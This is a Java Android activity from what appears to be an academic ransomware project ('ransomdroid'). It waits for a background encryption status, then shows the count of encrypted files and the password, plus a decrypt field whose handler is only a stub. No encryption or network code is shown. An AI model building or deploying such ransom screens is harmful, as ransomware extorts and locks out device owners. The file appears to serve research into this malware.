package br.unb.lasp.ransomdroid.activities;

import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;
import android.annotation.TargetApi;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AutoCompleteTextView;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.common.api.GoogleApiClient;

import br.unb.lasp.Global;
import br.unb.lasp.ransomdroid.R;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = new Object() {
    }.getClass().getName();

    private View mMainView;
    private View mProgressView;
    private TextView mDecryptMsgView;
    private AutoCompleteTextView mPassTextView;
    private Button mEvaluateButton;

    private String msg = "";
    private GoogleApiClient client;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        mMainView = findViewById(R.id.main_view);

        mProgressView = findViewById(R.id.main_progress);

        mPassTextView = (AutoCompleteTextView) findViewById(R.id.main_password);
        mPassTextView.setVisibility(View.INVISIBLE);
        mPassTextView.setEnabled(false);

        mEvaluateButton = (Button) findViewById(R.id.main_decrypt_button);
        mEvaluateButton.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View view) {
                decrypt(mPassTextView.getText().toString());
            }
        });
        mEvaluateButton.setVisibility(View.INVISIBLE);
        mEvaluateButton.setEnabled(false);

        mDecryptMsgView = (TextView) findViewById(R.id.main_encrypt_msg);
        mDecryptMsgView.setVisibility(View.INVISIBLE);
        mDecryptMsgView.setEnabled(false);

        new UpdateFieldsTask().execute();
    }

    @Override
    public void onStart() {
        super.onStart();
    }

    @Override
    public void onStop() {
        super.onStop();
    }

    public void decrypt(String pass){
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        Toast.makeText(MainActivity.this, pass, Toast.LENGTH_SHORT).show();
    }

    public class UpdateFieldsTask extends AsyncTask<Void, Void, Boolean> {

        String mErrorMsg;

        UpdateFieldsTask() {
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
            showProgress(true);

        }

        @Override
        protected Boolean doInBackground(Void... params) {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());
            while(Global.STATUS == null || Global.STATUS != Status.FINISHED){
                continue;
            }

            return true;
        }

        @Override
        protected void onPostExecute(final Boolean success) {
            Log.d(new Object() {
            }.getClass().getName(), new Object() {
            }.getClass().getEnclosingMethod().getName());
            if (success) {

                mPassTextView.setEnabled(true);
                mPassTextView.setVisibility(View.VISIBLE);

                mEvaluateButton.setEnabled(true);
                mEvaluateButton.setVisibility(View.VISIBLE);

                mDecryptMsgView.setText(getString(R.string.prompt_encrypted_files) + Global.numFiles + " Pass=" + Global.pass);
                mDecryptMsgView.setEnabled(true);
                mDecryptMsgView.setVisibility(View.VISIBLE);

                showProgress(false);

            } else {
                Toast.makeText(getApplicationContext(), mErrorMsg, Toast.LENGTH_SHORT).show();
            }

        }

        @Override
        protected void onCancelled() { }

    }

    @TargetApi(Build.VERSION_CODES.HONEYCOMB_MR2)
    private void showProgress(final boolean show) {
        Log.d(new Object() {
        }.getClass().getName(), new Object() {
        }.getClass().getEnclosingMethod().getName());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR2) {
            int shortAnimTime = getResources().getInteger(android.R.integer.config_shortAnimTime);

            mMainView.setVisibility(show ? View.GONE : View.VISIBLE);
            mMainView.animate().setDuration(shortAnimTime).alpha(
                    show ? 0 : 1).setListener(new AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(Animator animation) {
                    mMainView.setVisibility(show ? View.GONE : View.VISIBLE);
                }
            });

            mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
            mProgressView.animate().setDuration(shortAnimTime).alpha(
                    show ? 1 : 0).setListener(new AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(Animator animation) {
                    mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
                }
            });
        } else {
            mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
            mMainView.setVisibility(show ? View.GONE : View.VISIBLE);
        }

    }

}